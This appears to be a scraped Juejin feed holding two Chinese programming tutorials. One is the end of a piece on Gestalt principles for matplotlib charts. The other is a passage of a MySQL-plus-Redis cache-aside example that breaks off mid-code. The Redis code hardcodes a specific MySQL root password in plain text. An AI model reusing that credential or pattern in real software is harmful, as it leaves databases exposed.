<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 包围原理</span>
<span class="hljs-comment"># 创建测试数据</span>
np.random.seed(<span class="hljs-number">42</span>)
x1 = np.random.normal(<span class="hljs-number">2</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)
y1 = np.random.normal(<span class="hljs-number">3</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)

x2 = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)
y2 = np.random.normal(<span class="hljs-number">5</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">50</span>)

<span class="hljs-comment"># 包围原理示例</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 左侧：未应用包围原理</span>
ax1.scatter(x1, y1, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"blue"</span>)
ax1.scatter(x2, y2, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"red"</span>)

<span class="hljs-comment"># 右侧：应用包围原理</span>
<span class="hljs-keyword">from</span> matplotlib.patches <span class="hljs-keyword">import</span> Ellipse

ax2.scatter(x1, y1, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"blue"</span>, label=<span class="hljs-string">"组A"</span>)
ax2.scatter(x2, y2, alpha=<span class="hljs-number">0.7</span>, color=<span class="hljs-string">"red"</span>, label=<span class="hljs-string">"组B"</span>)

<span class="hljs-comment"># 添加包围区域</span>
ellipse1 = Ellipse((<span class="hljs-number">2</span>, <span class="hljs-number">3</span>), width=<span class="hljs-number">4</span>, height=<span class="hljs-number">3</span>, edgecolor=<span class="hljs-string">"blue"</span>)
ellipse2 = Ellipse((<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), width=<span class="hljs-number">4</span>, height=<span class="hljs-number">3</span>, edgecolor=<span class="hljs-string">"red"</span>)

ax2.add_patch(ellipse1)
ax2.add_patch(ellipse2)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bb6639831414c0e809fcecbee0b4e24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=8MHBiGHfbZijkc%2BCxF8SxixW7LM%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：使用边界、背景色或容器将相关的数据元素包围起来，可以明确地告诉观众这些元素属于同一组。</p>
<h2 data-id="heading-3">4. 闭合原理：大脑的"自动补全"</h2>
<p><strong>闭合原理</strong>就是大脑是天生的“补图高手”。即使图形不完整，只要有足够的提示，大脑也会自动脑补出缺失的部分。</p>
<p>比如看到一个虚线画圆，你不会觉得那是断断续续的线段，你会直接说：“这是一个圆”。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 闭合原理示例</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 创建一些不完整的数据点</span>
np.random.seed(<span class="hljs-number">42</span>)
angles = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi, <span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 故意少一个点形成不闭合</span>
radii = np.random.uniform(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)
x = radii * np.cos(angles)
y = radii * np.sin(angles)

<span class="hljs-comment"># 左侧：不完整的形状（未利用闭合原理）</span>
ax1.plot(x, y, <span class="hljs-string">'o-'</span>, linewidth=<span class="hljs-number">2</span>, markersize=<span class="hljs-number">8</span>)

<span class="hljs-comment"># 右侧：闭合的形状（应用闭合原理）</span>
<span class="hljs-comment"># 添加缺失的点使形状闭合</span>
angles_closed = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi, <span class="hljs-number">7</span>)
radii_closed = np.append(radii, radii[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 回到起点</span>
x_closed = radii_closed * np.cos(angles_closed)
y_closed = radii_closed * np.sin(angles_closed)

ax2.plot(x_closed, y_closed, <span class="hljs-string">'o-'</span>, linewidth=<span class="hljs-number">2</span>, markersize=<span class="hljs-number">8</span>)
ax2.fill(x_closed, y_closed, alpha=<span class="hljs-number">0.3</span>)  <span class="hljs-comment"># 填充增强闭合感</span>

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d200716905554f469c66f2a43c03eee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=JBeEWYpHOa6kP51SiMF4S6O3oDc%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：我们不需要展示每一个细节，可以利用观众的自动补全能力来简化图表。</p>
<p>但要<strong>注意</strong>，过于不完整的图形可能导致误解。</p>
<h2 data-id="heading-4">5. 连续原理：流畅的"视觉路径"</h2>
<p><strong>连续原理</strong>就是顺藤摸瓜。我们的视线倾向于跟随平滑、连续的路径，而不是剧烈折线或不规则的排列。</p>
<p>比如排队时，如果队伍弯弯曲曲但每个人都看着前一个人的后脑勺，你知道这还是一条队。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 连续原理示例</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 创建数据</span>
np.random.seed(<span class="hljs-number">42</span>)
time = np.arange(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0.1</span>)
signal1 = np.sin(time) + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-built_in">len</span>(time))
signal2 = np.cos(time) + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-built_in">len</span>(time))

<span class="hljs-comment"># 左侧：不连续的展示</span>
ax1.plot(time[:<span class="hljs-number">50</span>], signal1[:<span class="hljs-number">50</span>], <span class="hljs-string">'b-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号A (第一部分)'</span>)
ax1.plot(time[<span class="hljs-number">70</span>:], signal1[<span class="hljs-number">70</span>:], <span class="hljs-string">'b--'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号A (第二部分)'</span>)
ax1.plot(time[:<span class="hljs-number">40</span>], signal2[:<span class="hljs-number">40</span>], <span class="hljs-string">'r-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号B (第一部分)'</span>)
ax1.plot(time[<span class="hljs-number">60</span>:], signal2[<span class="hljs-number">60</span>:], <span class="hljs-string">'r--'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号B (第二部分)'</span>)

<span class="hljs-comment"># 右侧：连续的展示</span>
ax2.plot(time, signal1, <span class="hljs-string">'b-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号A'</span>)
ax2.plot(time, signal2, <span class="hljs-string">'r-'</span>, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'信号B'</span>)

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd01873808c24a7784543b1773be36db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=SVy9%2F1zNOqAtA%2FcGFGuse2hz7Jw%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：保持线条、形状或元素的连续性可以帮助观众追踪数据的变化趋势。在折线图、面积图中尤其重要。</p>
<h2 data-id="heading-5">6. 连接原理：看得见的"关系线"</h2>
<p><strong>连接原理</strong>就是藕断丝连。被线连接的物体，被视为强关联。这个视觉信号比颜色和距离都要强。</p>
<p>比如，两个人站得再远，如果手里牵着一根绳子，你也会觉得他们俩在互动。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 连接原理示例 - 散点图版本</span>
fig, (ax1, ax2) = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 创建散点数据：4个相关点集，每个点集有5个点</span>
np.random.seed(<span class="hljs-number">42</span>)
n_points = <span class="hljs-number">5</span>
n_groups = <span class="hljs-number">4</span>

<span class="hljs-comment"># 为每组生成相关点</span>
groups = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_groups):
    center_x = np.random.uniform(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)
    center_y = np.random.uniform(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)

    <span class="hljs-comment"># 生成围绕中心的相关点</span>
    x_points = center_x + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, n_points)
    y_points = center_y + np.random.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.8</span>, n_points)

    <span class="hljs-comment"># 添加一些趋势</span>
    trend = np.random.uniform(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)
    y_points = y_points + trend * (x_points - center_x)

    groups.append((x_points, y_points))

<span class="hljs-comment"># 左侧：未应用连接原理（独立的散点）</span>
colors = [<span class="hljs-string">"blue"</span>, <span class="hljs-string">"red"</span>, <span class="hljs-string">"green"</span>, <span class="hljs-string">"orange"</span>]
markers = [<span class="hljs-string">"o"</span>, <span class="hljs-string">"s"</span>, <span class="hljs-string">"^"</span>, <span class="hljs-string">"D"</span>]

<span class="hljs-keyword">for</span> i, (x_points, y_points) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    ax1.scatter(
        x_points,
        y_points,
        color=colors[i],
        marker=markers[i],
        alpha=<span class="hljs-number">0.7</span>,
        s=<span class="hljs-number">80</span>,
        label=<span class="hljs-string">f"数据集<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>"</span>,
    )


<span class="hljs-comment"># 右侧：应用连接原理（连接相关散点）</span>
<span class="hljs-keyword">for</span> i, (x_points, y_points) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    <span class="hljs-comment"># 首先绘制连接线</span>
    <span class="hljs-comment"># 按照x值排序，使连接线更有序</span>
    sorted_indices = np.argsort(x_points)
    sorted_x = x_points[sorted_indices]
    sorted_y = y_points[sorted_indices]

    ax2.plot(
        sorted_x,
        sorted_y,
        color=colors[i],
        linewidth=<span class="hljs-number">2</span>,
        alpha=<span class="hljs-number">0.5</span>,
        linestyle=<span class="hljs-string">"--"</span>,
        label=<span class="hljs-string">f"数据集<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>趋势线"</span>,
    )

    <span class="hljs-comment"># 然后绘制散点（在线上方，避免被线遮挡）</span>
    ax2.scatter(
        x_points,
        y_points,
        color=colors[i],
        marker=markers[i],
        alpha=<span class="hljs-number">0.7</span>,
        s=<span class="hljs-number">80</span>,
        edgecolor=<span class="hljs-string">"black"</span>,
        linewidth=<span class="hljs-number">1</span>,
    )

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7648e82d42a24ef2a69bcbd596482497~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942154&amp;x-signature=Yw6hbJzkNmpPfA2pHE%2FsNMDP%2Fdw%3D" alt="" loading="lazy"/></p>
<p><strong>设计要点</strong>：在散点图中，连接相关数据点的线可以帮助观众识别出数据的模式、趋势或分组关系。</p>
<p>这就像在地图上连接各个城市来显示旅行路线一样，使相关的点之间建立了明确的视觉联系。</p>
<h2 data-id="heading-6">7. 总结</h2>
<p>做数据可视化，不仅仅是写代码画图，更是一场 <strong>“注意力争夺战”</strong>。
通过这 6 个格式塔原理，我们不是在改变数据本身，而是在优化数据的呈现方式，让读者的脑力消耗降到最低。</p>
<p>每次我们画图时，不妨问自己一句：</p>
<ul>
<li>“这些数据应该是一组吗？它们靠得够近吗？”（邻近）</li>
<li>“重点数据突出了吗？”（包围/相似）</li>
<li>“视线流动顺畅吗？”（连续）</li>
</ul>
<p>最好的可视化不是展示所有数据，而是引导观众看到最重要的信息。格式塔原理就是我们实现这一目标的强大工具。</p>
<p>希望这篇文章能帮助你在创建数据可视化时，更加有意地引导观众的注意力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL + Redis 协同 示例]]></title>    <link>https://juejin.cn/post/7589935326783094818</link>    <guid>https://juejin.cn/post/7589935326783094818</guid>    <pubDate>2026-01-02T07:18:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326783094818" data-draft-id="7590104561475305524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL + Redis 协同 示例"/> <meta itemprop="keywords" content="Redis,MySQL"/> <meta itemprop="datePublished" content="2026-01-02T07:18:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL + Redis 协同 示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:18:13.000Z" title="Fri Jan 02 2026 07:18:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>最小可运行、可复现</strong>的「MySQL + Redis 协同」示例，场景选最经典的<br/>
<strong>「缓存击穿/穿透保护 + 读写并发」</strong>：</p>
<ol>
<li>用户表在 MySQL。</li>
<li>热点用户查询先走 Redis，缓存未命中再回源 MySQL 并回填 Redis，同时解决并发回源问题（简单互斥锁）。</li>
<li>用户积分更新时，<strong>先写 MySQL，成功后立即淘汰缓存</strong>（Cache-Aside 模式）。</li>
</ol>
<p>创建初始数据</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 连上容器里的 MySQL：</span>
<span class="hljs-comment">-- docker exec -ti db /bin/bash</span>

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (
    id          <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    name        <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    score       <span class="hljs-type">INT</span>         <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    updated_at  <span class="hljs-type">TIMESTAMP</span>   <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">VALUES</span>
(<span class="hljs-number">1</span>, <span class="hljs-string">'alice'</span>, <span class="hljs-number">1000</span>, NOW()),
(<span class="hljs-number">2</span>, <span class="hljs-string">'bob'</span>,   <span class="hljs-number">950</span>,  NOW()),
(<span class="hljs-number">3</span>, <span class="hljs-string">'cc'</span>,    <span class="hljs-number">820</span>,  NOW());
</code></pre>

<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-string">"""
MySQL + Redis 协同（完整版）
1. Cache-Aside + 延迟双删（写）
2. 分布式互斥回源（读）
3. 简单重试 &amp; 日志
"""</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, local

logging.basicConfig(level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">"%(asctime)s %(levelname)s %(message)s"</span>)
log = logging.getLogger(<span class="hljs-string">"collab"</span>)

<span class="hljs-comment"># ---------------- 配置 ----------------</span>
MYSQL_CFG = <span class="hljs-built_in">dict</span>(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">"root"</span>,
                 password=<span class="hljs-string">"DjAnGoBlOg!2!Q@W#E"</span>, database=<span class="hljs-string">"redis_demo"</span>, charset=<span class="hljs-string">"utf8mb4"</span>, autocommit=<span class="hljs-literal">True</span>)

REDIS_CFG = <span class="hljs-built_in">dict</span>(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>, decode_responses=<span class="hljs-literal">True</span>)

CACHE_TTL = <span class="hljs-number">60</span>
LOCK_TTL = <span class="hljs-number">5</span>
RETRY = <span class="hljs-number">3</span>
<span class="hljs-comment"># -------------------------------------</span>


<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cursor</span>():
    conn = pymysql.connect(**MYSQL_CFG)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cur:
            <span class="hljs-keyword">yield</span> cur
    <span class="hljs-keyword">finally</span>:
        conn.close()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span>:
    <span class="hljs-string">"""业务层：屏蔽缓存细节"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.r = redis.Redis(**REDIS_CFG)

    <span class="hljs-comment"># ---------- 读 ----------</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">dict</span> | <span class="hljs-literal">None</span>:
        key = <span class="hljs-string">f"user:<span class="hljs-subst">{uid}</span>"</span>
        <span class="hljs-comment"># ① 缓存命中</span>
        <span class="hljs-keyword">if</span> data := self.r.get(key):
            <span class="hljs-keyword">return</span> json.loads(data)

        <span class="hljs-comment"># ② 分布式互斥（简单 SET NX）</span>
        lock_key = <span class="hljs-string">f"<span class="hljs-subst">{key}</span>:lock"</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.r.<span class="hljs-built_in">set</span>(lock_key, <span class="hljs-number">1</span>, nx=<span class="hljs-literal">True</span>, ex=LOCK_TTL):
            time.sleep(<span class="hljs-number">0.05</span>)                       <span class="hljs-comment"># 50 ms 后重读</span>
            <span class="hljs-keyword">return</span> self.get_user(uid)

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ③ double-check</span>
            <span class="hljs-keyword">if</span> data := self.r.get(key):
                <span class="hljs-keyword">return</span> json.loads(data)
            <span class="hljs-comment"># ④ 回源</span>
            <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
                cur.execute(<span class="hljs-string">"SELECT id,name,score FROM user WHERE id=%s"</span>, (uid,))
                row = cur.fetchone()
                user = {<span class="hljs-string">"id"</span>: row[<span class="hljs-number">0</span>], <span class="hljs-string">"name"</span>: row[<span class="hljs-number">1</span>], <span class="hljs-string">"score"</span>: row[<span class="hljs-number">2</span>]} <span class="hljs-keyword">if</span> row <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
            <span class="hljs-keyword">if</span> user:
                self.r.setex(key, CACHE_TTL, json.dumps(user))
            <span class="hljs-keyword">return</span> user
        <span class="hljs-keyword">finally</span>:
            self.r.delete(lock_key)

    <span class="hljs-comment"># ---------- 写 ----------</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_score</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span>, delta: <span class="hljs-built_in">int</span></span>):
        <span class="hljs-string">"""延迟双删策略"""</span>
        key = <span class="hljs-string">f"user:<span class="hljs-subst">{uid}</span>"</span>
        <span class="hljs-comment"># ① 删缓存</span>
        self.r.delete(key)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ② 写 MySQL</span>
            <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
                cur.execute(<span class="hljs-string">"UPDATE user SET score=score+%s WHERE id=%s"</span>, (delta, uid))
            <span class="hljs-comment"># ③ 延迟二次删（防并发读脏）</span>
            time.sleep(<span class="hljs-number">0.3</span>)
            self.r.delete(key)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            log.exception(<span class="hljs-string">"add_score error"</span>)
            <span class="hljs-keyword">raise</span>


<span class="hljs-comment"># ---------------- 压测 ----------------</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">reader</span>(<span class="hljs-params">uid</span>):
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
        log.info(<span class="hljs-string">"get uid=%s  data=%s"</span>, uid, UserService().get_user(uid))
        time.sleep(<span class="hljs-number">0.1</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">writer</span>(<span class="hljs-params">uid, delta</span>):
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
        UserService().add_score(uid, delta)
        log.info(<span class="hljs-string">"updated uid=%s  delta=%s"</span>, uid, delta)
        time.sleep(<span class="hljs-number">0.4</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># 预热</span>
    svc = UserService()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>):
        log.info(<span class="hljs-string">"preload %s"</span>, svc.get_user(i))

    <span class="hljs-comment"># 并发</span>
    threads = []
    <span class="hljs-keyword">for</span> uid <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>):
        threads.append(Thread(target=reader, args=(uid,)))
        threads.append(Thread(target=writer, args=(uid, <span class="hljs-number">10</span>)))
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()

    <span class="hljs-comment"># 最终榜</span>
    <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
        cur.execute(<span class="hljs-string">"SELECT id,name,score FROM user ORDER BY score DESC"</span>)
